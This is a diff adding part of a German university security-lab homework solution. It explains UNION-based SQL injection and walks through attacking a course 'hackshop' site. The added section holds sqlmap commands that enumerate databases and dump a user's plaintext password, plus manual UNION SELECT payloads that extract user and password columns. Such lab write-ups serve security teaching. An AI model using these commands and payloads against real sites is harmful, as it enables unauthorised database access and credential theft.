@@ -59,7 +59,124 @@
 	\item Wenn der Angreifer weiß, wie viele Spalten die eigentliche Anfrage hatte, kann er eine Injection zusammenstellen, die wieder genauso viele Spalten hat als Ergebnis. Dies ist wichtig, da die Daten aus den Anfragen selten direkt dem Nutzer gezeigt werden. Meistens werden sie noch durch eine Logik der Anwendung verarbeitet und aufbereitet. Wenn die Injection nun nicht die richtige Spaltenanzahl hat werden die meisten Anwendung die Darstellung abbrechen und nur einen Fehler zeigen. Wenn das Ziel des Angriffs eine Manipulation der Daten ist, kann dies ausreichen. Will der Angreifer aber Daten aus der Datenbank erhalten, will er diese auch angezeigt bekommen.
 	\item 
 \end{itemize}
+
 \subsection*{b)}
+Zuerst im Browser mal auf den shop gehen und schauen, was er so macht. Man musste unten nmap oder wireshark auswählen und dann auf Details ansehen klicken. Hierdurch wurde man auf die Seite "`details\_tools.php"' weitergeleitet und bekommt ein paar daten über z.B. Wireshark.
+
+Durch das Firefox-plugin Tamper Data konnten wir herausfinden, dass als Post dabei der wert tool=1 (für nmap) bzw tool=2 (für wireshark) übergeben werden. Dies können wir ausnutzen, um mit sqlmap die Datenbank(en) anzuschauen. Hierfür benutzen wir zunächst folgenden Befehl:
+\begin{verbatim}
+sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --tables
+\end{verbatim}
+Der gibt uns sowohl die vorhandenen Datenbanken, als auch die dazu gehörigen Tabellen:
+
+\begin{verbatim}
+Database: webshop
+[2 tables]
++---------------------------------------+
+| artikel                               |
+| logs                                  |
++---------------------------------------+
+\end{verbatim}
+
+\begin{verbatim}
+Database: secureuserdata
+[1 table]
++---------------------------------------+
+| accessdata                            |
++---------------------------------------+
+\end{verbatim}
+
+\begin{verbatim}
+Database: information_schema
+[28 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| KEY_COLUMN_USAGE                      |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+\end{verbatim}
+
+\begin{verbatim}
+Database: mysql
+[23 tables]
++---------------------------------------+
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| event                                 |
+| func                                  |
+| general_log                           |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| host                                  |
+| ndb_binlog_index                      |
+| plugin                                |
+| proc                                  |
+| procs_priv                            |
+| servers                               |
+| slow_log                              |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+\end{verbatim}
+
+Die erste Datenbank (webshop) sah nicht wichtig für Benutzerdaten aus, da sie als Tabellen nur artikel und logs besaß. Die nächste Datenbank jedoch hieß secureuserdata und besaß eine tabelle accessdata.
+Diese tabelle haben wir zunächst nach Passwörtern durchsuchen lassen (mit dem --passwords befehl):\\
+
+sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --passwords -D secureuserdata -T accessdata\\
+
+Es gab einige Ergebnisse, allerdings keins, mit dem namen jack (sondern nur sowas wie root, phpmyadmin usw.). Da alle diese Passwörter gehashed waren haben wir die Tabelle einfach mal so via --dump Befehl ausgeben lassen. Dabei haben wir den user jack angegeben:\\
+
+sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --dump -D secureuserdata -T accessdata -U jack\\
+
+Das Ergebnis war der Eintrag jack mit der id 3 und dem passwort london. Demnach wurde das Passwort wohl unverschlüsselt in der Tabelle abgelegt.
+
+
+Alternative: direkt über die Internetseite Query's abschicken.
+\begin{verbatim}
+'UNION SELECT NULL,schema_name,NULL,NULL FROM information_schema.schemata LIMIT 2,1;#
+
+'UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='secureuserdata';#
+
+'UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='accessdata' AND table_schema='secureuserdata' LIMIT 1,1;#
+user
+'UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='accessdata' AND table_schema='secureuserdata' LIMIT 2,1;#
+password
+
+'UNION SELECT NULL,user,password,NULL FROM secureuserdata.accessdata LIMIT 1,1;#
+'UNION SELECT NULL,user,password,NULL FROM secureuserdata.accessdata WHERE user='jack';#
+\end{verbatim}
 
 
 \subsection*{c)}
